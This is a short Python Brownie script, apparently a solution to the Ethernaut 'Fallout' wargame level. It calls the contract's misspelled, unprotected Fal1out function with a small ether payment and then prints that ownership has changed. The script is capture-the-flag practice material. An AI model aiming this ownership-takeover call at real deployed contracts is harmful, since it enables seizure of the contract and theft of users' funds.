from brownie import interface,network,config
from scripts.helpful import get_account
from web3 import Web3


def exploit():
    #Get account address
    account = get_account()
    #Get Contract
    fallout = interface.Fallout(config["Address"])
    #Call Function fal1out
    fallout.Fal1out({"from": account, "value": Web3.toWei(0.0002, "ether")})
    print("ownership changed")
    print("done")




def main():
    exploit()
